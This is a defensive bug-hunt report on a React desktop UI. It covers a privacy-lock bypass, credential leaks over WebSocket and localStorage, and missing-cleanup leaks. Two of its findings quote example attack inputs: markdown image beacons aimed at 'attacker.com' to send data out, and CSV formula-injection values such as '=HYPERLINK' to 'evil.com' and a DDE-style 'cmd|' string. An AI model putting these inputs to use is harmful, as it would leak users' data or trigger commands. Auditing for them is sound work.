# Quenderin React UI — Deep Bug Hunt (2026-06-27)

This deep hunt swept four React-UI subsystems — render-safety, socket-lifecycle, app-state, and settings-metrics — surfacing 29 candidate findings, of which 23 survived adversarial verification. The confirmed set is dominated by missing-cleanup leaks (untracked timers, RAF, and fetches firing setState/`onSend`/inference after unmount) and a cluster of credential-exposure issues on the WebSocket transport (auth token in the upgrade URL, plus the privacy passphrase persisted to localStorage and broadcast in every `settings_update` frame). The single critical is a privacy-lock bypass: a blank passphrase makes `!expectedPassphrase` truthy, auto-unlocking the app with no challenge. Render-safety findings are real but narrower than first flagged — `react-markdown` blocks `javascript:`/`data:` on image `src`, so the residual is an unconditional outbound `https:` image fetch that breaks the offline/private guarantee, not script execution. The remaining confirmed items are correctness/UX races (mid-session re-lock on settings sync, stale-data overwrite in the sidebar, a non-functional ErrorBoundary retry) and low-severity hygiene (unguarded WS-frame parsing, CSV formula injection, NaN crosshair coordinates).

## Finding details

### Critical — PrivacyLock auto-unlocks on a blank passphrase
`ui/src/components/PrivacyLock.tsx:23-27,74`

**Why it bites.** The effect at lines 23-27 reads `if (!isEnabled || !expectedPassphrase) { onUnlock(); }`. An empty string is falsy in JavaScript, so `!expectedPassphrase` is true whenever the passphrase is blank, and `onUnlock()` (= `setIsLocked(false)` at App.tsx:444) fires with no user challenge. The render gate at line 74 hides the overlay on the same condition. The App-level guard (App.tsx:371-377) compounds it: when `privacyPassphrase` is `''` the else-branch runs `setIsLocked(false)`, so app state never locks. The effect also calls `onUnlock()` unconditionally whenever `isEnabled` flips false — e.g. a settings sync arriving before the passphrase field is populated unlocks the app with no user interaction.

**Repro.** Enable privacy lock, save with an empty passphrase (or set `privacyPassphrase` to `''`), reload. PrivacyLock renders null and calls `onUnlock()` immediately, no lock screen shown.

**Fix.** Remove the auto-unlock effect entirely — the overlay disappearing is sufficient and the proactive `onUnlock()` invites a re-entrancy loop if it re-enables the lock. Gate the component purely via the render path: `if (!isEnabled || !expectedPassphrase) return null`. In `SettingsArea`, validate that `privacyPassphrase` is a non-empty string before allowing privacy lock to be enabled.

**Verifier reasoning.** Confirmed real. Both the App-level guard failure (`''` passphrase → `setIsLocked(false)` else-branch) and the PrivacyLock effect path are reachable in normal use; the empty-string falsy check is the root cause in both places.

### High — Auth token leaked in WebSocket URL query string
`ui/src/hooks/useAgentSocket.ts:60`

**Why it bites.** The token is appended as `?token=<value>` to the WS upgrade URL. DevTools Network → WS records the URL, Electron main-process stdout logs the upgrade, any local proxy sees it, and on non-Electron targets it lands in `window.location.href`/browser history. `api.ts` already correctly uses an `X-Auth-Token` header for HTTP, so the WS path is the lone leak.

**Repro.** Electron renderer DevTools → Network → filter WS: `ws://localhost:<port>/ws?token=<secret>` is plainly visible.

**Fix.** Remove `?token=`. After `ws.onopen`, send `ws.send(JSON.stringify({ type: 'auth', token }))` and have the server reject all other messages until it receives a valid auth frame (browser WebSocket can't set custom upgrade headers, so a first-message protocol is the correct mitigation).

**Verifier reasoning.** Confirmed at line 60; the code comment at line 57 even labels it "audit HIGH #1." No out-of-band mechanism exists for the WS upgrade path.

### High — privacyPassphrase persisted and broadcast in plaintext
`ui/src/hooks/useAgentSocket.ts:21,82-83,282,284,291,293`

**Why it bites.** `AppSettings` includes `privacyPassphrase: string` (line 21). `updateSettings` serialises the whole settings object — passphrase included — to localStorage (line 282) and sends it over WS as `{ type: 'settings_update', ...newSettings }` (line 284). The same spread re-sends it on reconnect (line 83, via `settingsRef.current`) and on `resetSettings` (lines 291, 293). Any same-origin reader or WS observer recovers the passphrase in cleartext; old values linger in localStorage until overwritten.

**Repro.** Set a passphrase, then `localStorage.getItem('quenderin_settings')` shows it in plain JSON; every `settings_update` WS frame contains `"privacyPassphrase":"<secret>"`.

**Fix.** Exclude the passphrase from both persistence and the WS payload — split it into an in-memory `sensitiveSettings` object, or derive a key client-side and never store/transmit the raw value. Concretely: `const { privacyPassphrase: _, ...safeSettings } = settingsRef.current; ws.send(JSON.stringify({ type: 'settings_update', ...safeSettings }));`

**Verifier reasoning.** Confirmed across all cited lines — plaintext in localStorage and in every `settings_update` frame, including reconnect and reset paths.

### Medium — react-markdown renders LLM image src without scheme validation
`ui/src/components/GeneralChatArea.tsx:281-301`

**Why it bites.** No custom `img` override exists in any `ReactMarkdown` call, so the default renderer emits `<img src>` verbatim. An LLM response containing `![x](https://attacker.com/beacon?data=...)` triggers an unconditional outbound request on render — leaking the user's IP and inference context — which breaks the "fully offline / private / local AI" guarantee shown at line 447.

**Repro.** LLM emits `![x](https://attacker.com/log?data=sensitive)`; the browser fetches the URL on render with no user interaction.

**Fix.** Add a custom `img` component that allows only `http(s)` and consider blocking images entirely given the offline threat model:
```
function SafeImage({src, alt}) {
  if (!src?.startsWith('https://') && !src?.startsWith('http://')) return null;
  return <img src={src} alt={alt ?? ''} loading="lazy" />;
}
```

**Verifier reasoning.** Narrowed from the candidate. Via `html-url-attributes/lib/index.js:20-30`, `img[src]` passes through `defaultUrlTransform`, so `javascript:`/`data:` URIs *are* blocked — that part of the candidate is false. But `https://` is in `safeProtocol`, so an `https:` image fetch fires unconditionally. Severity is medium (privacy/data-leak), not high (no script execution).

### Medium — Queue-drain setTimeout not cancelled on unmount
`ui/src/components/GeneralChatArea.tsx:171-182`

**Why it bites.** The effect at line 171 fires a 300 ms `setTimeout` (line 174) with no `clearTimeout` in cleanup. If the component unmounts while the timer is pending, the callback runs `setMessageQueue([])`, `setIsQueuing(false)`, `onSend(combined, [])`, and `setLastSentPayload(...)` on a dead component. The setState calls are React-18 no-ops, but `onSend` is a real side effect: it kicks off a new backend inference run with stale queued messages after the UI is gone — wasted compute, output that is never displayed.

**Repro.** Queue a message while the agent is running, then close/navigate the chat before 300 ms elapses. `onSend()` fires anyway.

**Fix.** Capture the id and cancel in cleanup: `const id = setTimeout(() => { ... }, 300); return () => clearTimeout(id);`

**Verifier reasoning.** Confirmed; the effect returns no cleanup. The spurious inference run is a real, reachable misbehavior — medium.

### Medium — Missing ws.onerror → silent reconnect storm
`ui/src/hooks/useAgentSocket.ts:55-196`

**Why it bites.** `connect()` assigns `onopen`, `onmessage`, and `onclose` but never `onerror`. On an upgrade rejection (401 bad token, or ECONNREFUSED at startup) the browser fires `onerror` then `onclose`; with `onerror` unhandled, the user sees no cause and `onclose` triggers the exponential-backoff loop (up to 15 attempts, ~55 s). Worse, line 66 resets `reconnectAttempts=0` on every successful `onopen`, so a server that accepts then immediately drops (e.g. during model load) produces an *unbounded* retry storm.

**Repro.** Start the renderer before the backend is ready, or with an invalid token: DevTools shows repeated WS attempts with no user-visible cause. Accept-then-drop resets the counter and retries indefinitely.

**Fix.** Add `ws.onerror = (ev) => console.error('WS error', ev)` at minimum. Distinguish "server rejected upgrade" (don't reconnect; show a clear error) from "dropped mid-session" (reconnect with backoff), and defer the `reconnectAttempts=0` reset until the connection has been stable for ~5 s.

**Verifier reasoning.** Confirmed from the code alone — no `onerror` assignment, and the line-66 reset makes the accept-then-drop loop unbounded.

### Medium — setInterval in handleDownloadVoice leaks on unmount
`ui/src/App.tsx:48-61`

**Why it bites.** `handleDownloadVoice` creates a 500 ms `setInterval` at line 48, declared `const interval` inside the `try` block. It's cleared on success (line 55), but the `catch` block (lines 58-61) is out of scope for that `const` and cannot reference it — so on error or mid-download unmount the interval is never cleared and keeps firing `setVoiceDownloadProgress` on a dead component, consuming CPU and pinning the closure.

**Repro.** Open wizard step 3 → click "Download Voice Engine" → dismiss the wizard via a concurrent path (e.g. a health check returns `isBrainInstalled=true` at App.tsx:274-276, flipping `showOnboarding=false`). The interval keeps firing every 500 ms.

**Fix.** Store the interval id where the catch can reach it (or a ref) and clear it there; better, move the fetch+interval into a `useEffect` with cleanup and an `AbortController` for the fetch.

**Verifier reasoning.** Confirmed real — the `catch` cannot see the `try`-scoped `const interval`, and the concurrent-unmount path via the health-check effect is reachable in normal use.

### Medium — Privacy lock re-locks on every settings sync
`ui/src/App.tsx:371-377`

**Why it bites.** The effect (deps `[settings.privacyLockEnabled, settings.privacyPassphrase]`) unconditionally calls `setIsLocked(true)` whenever both are truthy. `settings` comes from `useAgentSocket()` and is replaced by reference on any WS settings-sync, so a background settings push — or a WS reconnect replaying settings — re-locks the UI mid-session even though the user already unlocked. The overlay (`isEnabled={settings.privacyLockEnabled && isLocked}`, lines 441-445) reappears, interrupting the user.

**Repro.** Enable privacy lock, unlock, then trigger a settings-sync / WS reconnect. The overlay reappears with no user action.

**Fix.** Only initialize `isLocked=true` on the first settings load — track via a `settingsInitialized` ref and skip the re-lock on subsequent updates.

**Verifier reasoning.** Confirmed real — reference replacement on every sync re-runs the effect and re-locks; reachable on any reconnect or server push.

### Medium — Untracked setTimeout in model download/delete handlers
`ui/src/components/SettingsArea.tsx:161,174`

**Why it bites.** `handleDownloadModel` (line 161) and `handleDeleteModel` (line 174) call `setTimeout(refreshCatalog, 2000/500)` in a `finally` block with no stored id. `refreshCatalog` (lines 143-148) does `fetch('/api/models/catalog').then(d => setModelCatalog(...))` — an unabortable in-flight request. Navigate away before the timer fires and the fetch still completes, calling `setModelCatalog` on the unmounted (or freshly remounted, hence stale) instance.

**Repro.** Click "Download" on a model, then immediately click back within 2 s. The `/api/models/catalog` GET still fires ~2 s later; React DevTools shows the attempted setState on the unmounted `SettingsArea`.

**Fix.** Store the timeout ids and clear them in a `useEffect` cleanup; use an `AbortController` for the refetch so the in-flight request is also cancelled.

**Verifier reasoning.** Confirmed at both lines. Downgraded high→medium: React 18 silently discards the update — the real residue is a stale catalog update or spurious re-render, not data corruption.

### Medium — CSV formula injection via LLM-controlled goal_text
`ui/src/components/Metrics.tsx:101`

**Why it bites.** `exportMetricsCsv` escapes embedded double-quotes (`" → ""`) but does not neutralise formula-injection prefixes. `goal_text` is LLM/agent output — untrusted. A goal like `=HYPERLINK("http://evil.com","click")` or `@SUM(1+1)*cmd|` survives unchanged; opening the exported `.csv` in Excel/LibreOffice evaluates it as a formula (DDE/SSRF-equivalent exfiltration, or clickable-hyperlink social engineering).

**Repro.** Cause the agent to log a goal starting `=HYPERLINK("https://evil.example/","report")`, click "Export CSV", open in Excel — the Goal cell renders as a clickable hyperlink.

**Fix.** Prefix any cell value starting with `= + - @ \t \r` with a single quote: `const safeGoal = /^[=+\-@\t\r]/.test(m.goal_text) ? \`'${m.goal_text.replace(/"/g,'""')}\` : m.goal_text.replace(/"/g,'""')`. Also strip/escape embedded newlines that break row boundaries.

**Verifier reasoning.** Confirmed at line 101 — only double-quotes are escaped, no prefix sanitization. Medium is correct: exploitation requires opening the CSV in a formula-evaluating app, which is the primary use case for a CSV export.

### Low — CodeBlock setTimeout without cleanup
`ui/src/components/CodeBlock.tsx:11-13`

**Why it bites.** `handleCopy` schedules `setTimeout(() => setCopied(false), 2000)` with no cancel ref. During fast LLM streaming, CodeBlocks are frequently added/removed; if one unmounts within the window, `setCopied` runs on a dead component and the closure is held alive for 2 s. **Fix.** `useRef` for the timer + `useEffect(() => () => clearTimeout(timerRef.current), [])`. **Verifier:** confirmed; React-18 no-op but a real, trivially-fixed missing-cleanup — low.

### Low — Auto-scroll RAF not cancelled in effect cleanup
`ui/src/components/GeneralChatArea.tsx:107-121`

**Why it bites.** The effect cancels the *previous* RAF at the top of its body (line 108) and schedules a new one (line 113) but returns no cleanup, so the last RAF survives unmount and reaches `container.scrollTop = container.scrollHeight` on a detached node. **Fix.** `return () => cancelAnimationFrame(rafIdRef.current)`. **Verifier:** structurally confirmed; accessing `scrollTop` on a detached element is a no-op in modern engines, so practical impact is negligible — low.

### Low — agentLogs derived array as useEffect dep
`ui/src/components/ChatArea.tsx:35-41`

**Why it bites.** `agentLogs` is computed inline via `logs.filter(...)` (line 35) and used directly as the scroll effect's dep (line 41). `Array.filter` always returns a new reference, so the effect fires on every render — including parent re-renders unrelated to log content — jerking the view to the bottom while the user is scrolled up reading. **Repro.** Type in the goal textarea while viewing logs; each keystroke re-renders the parent → new array → scroll fires. **Fix.** Depend on `[agentLogs.length, agentLogs.at(-1)?.id]`, or `useMemo`. **Verifier:** confirmed; annoying UX regression, no data/security impact — low.

### Low — Unvalidated localStorage settings spread into WS messages
`ui/src/hooks/useAgentSocket.ts:37-39,83`

**Why it bites.** Settings load as `{ ...DEFAULT_SETTINGS, ...JSON.parse(saved) }` with no schema validation, so any extra key survives the merge and is spread into the `settings_update` frame on reconnect (line 83). A same-origin attacker who can write localStorage can inject arbitrary top-level fields into every frame; whether they cause server harm depends on server parsing. **Fix.** Strip to the `AppSettings` allow-list before storing and before sending. **Verifier:** code pattern is real; downgraded medium→low because it requires a same-origin localStorage writer (already a significant compromise) and server-side impact is out of scope of these files.

### Low — setState-after-unmount race in ws.onopen during reconnect
`ui/src/hooks/useAgentSocket.ts:64-67,201-205`

**Why it bites.** Cleanup (lines 201-205) sets `intentionallyClosed=true`, clears the timer, and closes the socket. If a reconnect `setTimeout(connect)` fires in the narrow window between being dequeued and `clearTimeout` running, `connect()` builds a new socket whose `onopen` (line 64) calls `setWsReady(true)`/`reconnectAttempts=0` with no `intentionallyClosed` guard — on an unmounted component. **Fix.** A `mounted` flag guarding every `setX` in `onopen`/`onclose`/`onmessage`. **Verifier:** real but narrow — React 18 no-op, and the window requires the timer to fire at exactly the wrong microsecond — low, confidence medium.

### Low — data.data.progress accessed without optional chaining
`ui/src/hooks/useAgentSocket.ts:150`

**Why it bites.** Line 150 reads `data.data.progress` with no null check. A `model_download_progress` frame without a `data` sub-object throws `TypeError`, swallowed by the outer try/catch (logged as "Invalid WS message") while the progress bar freezes at 0. The adjacent `action_required` branch (line 135) already uses `data.data?.code`, marking this an inconsistency. **Fix.** `setDownloadProgress(data.data?.progress ?? 0)`. **Verifier:** confirmed; reachable on any malformed frame — low.

### Low — PrivacyLock stale closure on failedAttempts
`ui/src/components/PrivacyLock.tsx:47-72`

**Why it bites.** `handleSubmit` is async and captures `failedAttempts` at closure time. Between the two `await hashPassphrase(...)` calls (lines 54-55) a re-render can mint a new closure, but the in-flight one keeps the stale count; a fast double-submit lets both compute `N+1` instead of `N+2`, so the 5-attempt lockout can be stretched. **Fix.** Functional updater `setFailedAttempts(prev => prev + 1)`, plus a `submitting` ref to block concurrent submits. **Verifier:** mechanism is accurate but SHA-256 via WebCrypto is sub-millisecond, so the race window is tiny and practically unexploitable — low, confidence medium.

### Low — handleFinish/handleDownloadVoice setTimeout fire setState after unmount
`ui/src/App.tsx:57,67`

**Why it bites.** `handleDownloadVoice` calls `setTimeout(() => setIsVoiceDownloading(false), 1000)` (line 57) untracked; if the wizard unmounts within 1 s (concurrent health-check at App.tsx:274-276) the callback runs setState on a dead component (React-18 no-op, but the closure is held alive). The `handleFinish` timeout (line 67) is `await new Promise(r => setTimeout(r, 500))` used purely as a delay before `onDismiss()` — it resolves before the unmount it itself causes, so it is not actually a setState-after-unmount. **Fix.** Track/cancel the line-57 id; make `handleFinish`'s delay synchronous or drop it. **Verifier:** partially real — only the line-57 timeout is a genuine issue, and it is resource hygiene, not a crash — low.

### Low — /api/sessions fetch has no cancellation
`ui/src/components/Sidebar.tsx:40-47`

**Why it bites.** The effect (lines 40-47) fires `fetch('/api/sessions')` on every `currentView` change with no `AbortController` or mounted-check. Two rapid nav clicks launch concurrent fetches that resolve in arbitrary order; the slower-but-earlier response can overwrite `recentSessions` with stale data (last-to-resolve wins). **Repro.** Click two nav items quickly; the wrong session list can win. **Fix.** `const ac = new AbortController(); fetch('/api/sessions', { signal: ac.signal })...; return () => ac.abort()`. **Verifier:** confirmed; the stale-data race is fully reachable (the sidebar collapses via CSS rather than unmounting, so the stale-update path dominates over the unmount path) — low.

### Low — ErrorBoundary retry does not reset child state
`ui/src/components/ErrorBoundary.tsx:20-22`

**Why it bites.** `handleRetry` only flips the boundary's own `hasError:false`. React preserves existing child instances on a class re-render, so a child that crashed due to corrupted local state re-throws immediately, `getDerivedStateFromError` fires again, and the retry button flickers content then re-errors — a non-functional retry. Lazy children (Inspector, Docs, Metrics, SettingsArea) sit under a Suspense above the boundary, which does *not* force remount on retry, so they re-crash too. **Fix.** Increment a `retryCount` in state and use it as a `key` on the child to force a full unmount/remount. **Verifier:** confirmed; impact is just a dead retry button (the boundary only fires post-crash) — low.

### Low — Uncleaned UI-state setTimeouts have no unmount guard
`ui/src/components/SettingsArea.tsx:189,247,254,267-270,274`

**Why it bites.** `handleSave` (189), `handleCopyDiagnostics` (247, 254), and `handleCopyManualDiagnostics` (267-270, 274) each schedule `setTimeout` callbacks that reset UI flags (`setIsSaved`/`setDiagCopied`/`setDiagCopiedFromFallback`/`setDiagCopyFailed`) with no stored id. Under strict-mode double-invoke or rapid tab switching a stale timer can fire against a remounted instance, clearing a "Settings Applied"/"Copied!" badge the new instance just showed. **Fix.** Collect the ids in a ref `Set` and clear them in a `useEffect` cleanup, or a `useTimeout` hook. **Verifier:** confirmed; purely cosmetic (badge disappears ~2 s early) — low.

### Low — localStorage type confusion silently disables context-size UI
`ui/src/components/SettingsArea.tsx:343-353` (root cause `ui/src/hooks/useAgentSocket.ts:38`)

**Why it bites.** `useAgentSocket` merges `{ ...DEFAULT_SETTINGS, ...JSON.parse(saved) }` with no schema coercion, so a stored `{"contextSize":"2048"}` (string) survives. The context-size buttons use strict equality `settings.contextSize === size` (line 343) where `size` is a number, so `"2048" !== 2048` — no button ever appears selected, and the string may also be defaulted-out by the backend. **Fix.** After `JSON.parse`, coerce numerics: `contextSize: Number.isFinite(Number(parsed.contextSize)) && Number(parsed.contextSize) > 0 ? Number(parsed.contextSize) : DEFAULT_SETTINGS.contextSize`. **Verifier:** UI-side strict-equality bug confirmed at line 343; root-cause parse is in `useAgentSocket.ts` (outside the scoped file set) and the trigger needs corrupt localStorage, so confidence medium — low.

### Low — NaN crosshair coordinates from malformed TAP command
`ui/src/components/Inspector.tsx:14-16`

**Why it bites.** Inspector parses the last `decide` log's command: `parts = command.split(' '); targetTap = { x: parseInt(parts[1],10), y: parseInt(parts[2],10) }`. A command of `'TAP'` (no args) yields `parseInt(undefined,10) → NaN`, so `targetTap = { x: NaN, y: NaN }`. The render guard `if (targetTap)` (line 80) is truthy (an object is always truthy), so the crosshair renders at `left:'NaN%' top:'NaN%'` — clamped by browsers to `0%`, pinning it to the device-frame top-left regardless of the real target. **Fix.** `const x = parseInt(parts[1],10), y = parseInt(parts[2],10); if (!isNaN(x) && !isNaN(y)) targetTap = { x, y };`. **Verifier:** confirmed exactly at lines 14-16; silently-wrong visual only, no functional impact — low.
